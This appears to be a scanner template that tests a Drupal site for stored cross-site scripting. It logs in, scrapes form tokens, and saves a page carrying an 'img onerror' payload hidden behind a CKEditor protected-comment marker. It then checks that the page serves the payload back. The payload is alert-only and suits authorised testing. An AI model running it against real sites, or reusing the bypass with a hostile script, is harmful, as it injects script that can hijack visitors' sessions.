flow: http(1) && http(2) && http(3) && http(4)
http:
- extractors:
  - internal: true
    kval:
    - set_cookie
    type: kval
  matchers:
  - condition: and
    dsl:
    - status_code == 302
    - contains(tolower(all_headers), "set-cookie")
    internal: true
    type: dsl
  raw:
  - 'POST /user/login HTTP/1.1

    Host: {{Hostname}}

    Content-Type: application/x-www-form-urlencoded


    name={{username}}&pass={{password}}&form_id=user_login&op=Log+in

    '
- extractors:
  - group: 1
    internal: true
    name: form_build_id
    part: body
    regex:
    - name="form_build_id" value="([^"]+)"
    type: regex
  - group: 1
    internal: true
    name: form_token
    part: body
    regex:
    - name="form_token" value="([^"]+)"
    type: regex
  matchers:
  - condition: and
    dsl:
    - status_code == 200
    - contains(body, "form_build_id")
    - contains(body, "form_token")
    internal: true
    type: dsl
  raw:
  - 'GET /node/add/page HTTP/1.1

    Host: {{Hostname}}

    '
- extractors:
  - group: 1
    internal: true
    name: node_url
    part: header
    regex:
    - 'Location: (.*/node/[0-9]+)'
    type: regex
  matchers:
  - condition: and
    dsl:
    - status_code == 302
    - 'contains_all(tolower(header), "location: ","/node/")'
    internal: true
    type: dsl
  raw:
  - 'POST /node/add/page HTTP/1.1

    Host: {{Hostname}}

    Content-Type: application/x-www-form-urlencoded


    title=XSSTest&body[und][0][value]=<!--{cke_protected}--><img src=x onerror=alert(document.domain)>&body[und][0][format]=full_html&changed=&form_build_id={{form_build_id}}&form_token={{form_token}}&form_id=page_node_form&status=1&comment=1&name={{username}}&op=Save

    '
- extractors:
  - kval:
    - node_url
    name: node_url
    type: kval
  matchers:
  - condition: and
    part: body
    type: word
    words:
    - <!--{cke_protected}-->
    - alert(document.domain)
  raw:
  - 'GET {{node_url}} HTTP/1.1

    Host: {{Hostname}}

    '
